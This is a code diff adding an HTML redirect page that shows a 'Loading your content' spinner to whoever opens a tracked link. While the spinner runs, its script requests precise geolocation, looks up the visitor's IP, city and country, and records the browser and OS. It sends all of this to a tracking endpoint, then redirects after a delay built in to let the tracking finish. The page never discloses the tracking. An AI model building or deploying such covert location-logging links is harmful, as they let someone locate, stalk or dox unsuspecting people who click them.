@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: white;
+        }
+        .loading-container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid white;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        .loading-subtext {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="spinner"></div>
+        <div class="loading-text">Loading your content...</div>
+        <div class="loading-subtext">Please wait while we prepare everything for you</div>
+    </div>
+
+    <script>
+        // Get link ID from URL
+        const pathParts = window.location.pathname.split('/');
+        const linkId = pathParts[pathParts.length - 1];
+        
+        // Function to get browser info
+        function getBrowserInfo() {
+            const userAgent = navigator.userAgent;
+            let browser = "Unknown";
+            let os = "Unknown";
+            
+            // Detect browser
+            if (userAgent.indexOf("Chrome") > -1) browser = "Chrome";
+            else if (userAgent.indexOf("Firefox") > -1) browser = "Firefox";
+            else if (userAgent.indexOf("Safari") > -1) browser = "Safari";
+            else if (userAgent.indexOf("Edge") > -1) browser = "Edge";
+            else if (userAgent.indexOf("Opera") > -1) browser = "Opera";
+            
+            // Detect OS
+            if (userAgent.indexOf("Windows") > -1) os = "Windows";
+            else if (userAgent.indexOf("Mac") > -1) os = "macOS";
+            else if (userAgent.indexOf("Linux") > -1) os = "Linux";
+            else if (userAgent.indexOf("Android") > -1) os = "Android";
+            else if (userAgent.indexOf("iOS") > -1) os = "iOS";
+            
+            return { browser, os };
+        }
+        
+        // Function to get location
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            });
+                        },
+                        (error) => {
+                            console.log("Location access denied or error:", error);
+                            resolve(null);
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }
+                    );
+                } else {
+                    resolve(null);
+                }
+            });
+        }
+        
+        // Function to get IP and location info
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    city: data.city,
+                    country: data.country_name
+                };
+            } catch (error) {
+                console.log("Error getting IP info:", error);
+                return null;
+            }
+        }
+        
+        // Main tracking function
+        async function trackUser() {
+            try {
+                // Get browser info
+                const browserInfo = getBrowserInfo();
+                
+                // Get location
+                const location = await getLocation();
+                
+                // Get IP info
+                const ipInfo = await getIPInfo();
+                
+                // Prepare tracking data
+                const trackingData = {
+                    linkId: linkId,
+                    location: location,
+                    userAgent: navigator.userAgent,
+                    browser: browserInfo.browser,
+                    os: browserInfo.os,
+                    ...ipInfo
+                };
+                
+                // Send tracking data to server
+                const response = await fetch('/api/track', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(trackingData)
+                });
+                
+                if (response.ok) {
+                    console.log("Tracking data sent successfully");
+                } else {
+                    console.log("Error sending tracking data");
+                }
+                
+            } catch (error) {
+                console.log("Error in tracking:", error);
+            }
+        }
+        
+        // Execute tracking and redirect
+        async function executeTracking() {
+            // Start tracking immediately
+            trackUser();
+            
+            // Show loading for a few seconds to allow tracking to complete
+            setTimeout(() => {
+                // Get the original URL from the server
+                fetch(`/api/get-original-url/${linkId}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success && data.originalUrl) {
+                            window.location.href = data.originalUrl;
+                        } else {
+                            // Fallback if no original URL found
+                            window.location.href = 'https://www.google.com';
+                        }
+                    })
+                    .catch(error => {
+                        console.log("Error getting original URL:", error);
+                        window.location.href = 'https://www.google.com';
+                    });
+            }, 3000); // 3 second delay to ensure tracking completes
+        }
+        
+        // Start the process
+        executeTracking();
+    </script>
+</body>
+</html>
